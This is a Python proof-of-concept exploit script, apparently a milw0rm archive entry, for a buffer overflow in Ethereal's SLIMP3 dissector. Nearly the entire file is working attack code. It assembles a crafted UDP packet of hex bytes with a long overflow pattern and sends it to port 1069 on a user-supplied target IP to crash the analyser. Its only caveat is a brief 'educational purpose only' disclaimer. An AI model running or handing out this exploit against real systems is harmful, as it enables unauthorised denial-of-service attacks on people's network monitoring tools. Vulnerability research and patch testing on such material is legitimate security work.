# ethereal_slimp3_bof.py
# Ethereal SLIMP3 Remote Buffer Overflow PoC
# Bug Discoverd by Vendor(?)   2005-10-19
# Coded by Sowhat
# http://secway.org
# 2005-10-20
# This PoC will crash the Ethereal
# Tested with Ethereal 0.10.12, WinPcap 3.1 beta4, WinXP SP2
# For educational purpose only, Use at your own risk!

# Version 0.9.1 to 0.10.12
# http://www.ethereal.com/docs/release-notes/ethereal-0.10.13.html
# "The SLIMP3 dissector could overflow a buffer. "
 
import sys
import string
import socket

if (len(sys.argv) != 2):
	print " ##################################################################"
	print " #                                                                #"
	print " #       Ethereal SLIMP3 Remote Buffer Overflow PoC               #"
	print " #                  Coded  by Sowhat                              #"
	print " #                 http://secway.org                              #"
	print " ##################################################################"
	print "\n Usage: " + sys.argv[0] + " TargetIP"
	print " TargetIP should be any IP address Ethereal can reach"
	sys.exit(0)

host = sys.argv[1]
port = 1069

victim = (host, port)

request  = "\x6C\xC3\xB2\xA1\x02\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00"
request += "\xFF\xFF\x00\x00\x01\x00\x00\x00\x56\x57\xF7\x42\x5B\x6A\x04\x00"
request += "\x58\x01\x00\x00\x58\x01\x00\x00\x00\x04\x20\x04\x19\xA2\x00\x0C"
request += "\x6E\xE3\xB7\xC7\x08\x00\x45\x00\x01\x4A\xB4\x6C\x40\x00\x40\x11"
request += "\x03\x79\xC0\xA8\x00\x0A\xC0\xA8\x00\x63\x0D\x9B\x0D\x9B\x01\x36"
request += "\x83\x05\x6C\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
request += "\x20\x20\x20\x20\x02\x33\x02\x00\x02\x30\x03\x03\x02\x40\x03\x10"
request += "\x03\x10\x03\x10\x03\x10\x03\x10\x03\x10\x03\x10\x03\x00\x02\x58"
request += "\x03\x10\x03\x10\x03\x08\x03\x04\x03\x02\x03\x01\x03\x01\x03\x00"
request += "\x02\x60\x03\x7F\x03\x00\x03\x00\x03\x00\x03\x00\x03\x00\x03\x00"
request += "\x03\x00\x02\x68\x03\x01\x03\x01\x03\x01\x03\x01\x03\x01\x03\x01"
request += "\x03\x01\x03\x00\x02\x50\x03\x01\x03\x01\x03\x02\x03\x04\x03\x08"
request += "\x03\x10\x03\x10\x03\x00\x02\x48\x03\x01\x03\x02\x03\x04\x03\x08"
request += "\x03\x10\x03\x10\x03\x1F\x03\x00\x02\x06\x02\x02\x02\x0C\x03\x20"
request += "\x03\x20\x03\x20\x03\x20\x03\x20\x03\x20\x03\x20\x03\x20\x03\x20"
request += "\x03\x20\x03\x20\x03\x02\x03\x00\x03\x05\x03\x5F\x03\x00\x03\x2E"
request += "\x03\x02\x03\x04\x03\x03\x03\x02\x03\x04\x03\x03\x03\x2E\x03\x02"
request += "\x03\x04\x03\x03\x03\x20\x03\x01\x03\x20\x03\x20\x03\x20\x03\x20"
request += "\x03\x20\x03\x20\x03\x20\x03\x20\x03\x20\x03\x20\x03\x20\x02\xC0"
request += "\x03\x20\x03\x20\x03\x20\x03\x20\x03\x20\x03\x20\x03\x20\x03\x20"
request += "\x03\x20\x03\x20\x03\x20\x03\x20\x03\x00\x03\x20\x03\x20\x03\x00"
request += "\x03\x2E\x03\x03\x03\x5F\x03\x02\x03\x03\x03\x01\x02\x03\x04\x01"
request += "\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01"
request += "\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02"
request += "\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03"
request += "\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04"
request += "\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01"
request += "\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01"
request += "\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02"
request += "\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03"
request += "\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04"
request += "\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01"
request += "\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01"
request += "\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02"
request += "\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03"
request += "\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04"
request += "\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01"
request += "\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01"
request += "\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02"
request += "\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03"
request += "\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04"
request += "\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01"
request += "\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01"
request += "\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02"
request += "\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03"
request += "\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04"
request += "\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01"
request += "\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01"
request += "\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02"
request += "\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03"
request += "\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04"
request += "\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01"
request += "\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01"
request += "\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02"
request += "\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03"
request += "\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04"
request += "\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01"
request += "\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01"
request += "\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02\x03\x04\x01\x01\x02"
request += "\x03\x04\x01\x5F"

s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.sendto(request, victim)
print " Ethereal should be crashed ! ;)"

# milw0rm.com [2005-10-20]
